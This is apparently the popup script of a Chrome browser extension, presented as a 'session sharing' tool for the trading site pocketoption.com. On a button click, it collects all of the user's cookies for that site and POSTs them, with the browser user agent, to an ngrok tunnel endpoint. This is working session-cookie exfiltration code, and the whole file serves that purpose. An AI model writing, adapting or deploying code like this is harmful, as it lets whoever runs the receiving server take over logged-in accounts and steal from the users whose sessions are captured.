document.getElementById('capture').addEventListener('click', async () => {
    const status = document.getElementById('status');
    status.textContent = 'Capturing...';

    try {
        const cookies = await chrome.cookies.getAll({ domain: 'pocketoption.com' });

        if (cookies.length === 0) {
            status.textContent = 'No cookies found! Login to PO.';
            return;
        }

        const response = await fetch('https://harlan-echolalic-ulysses.ngrok-free.dev/api/session/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                cookies: cookies,
                platform: 'desktop',
                userAgent: navigator.userAgent
            })
        });

        const result = await response.json();
        if (result.success) {
            status.textContent = '✅ Session Shared Successfully!';
        } else {
            status.textContent = '❌ Failed to share: ' + result.error;
        }
    } catch (err) {
        status.textContent = '❌ Error: ' + err.message;
    }
});
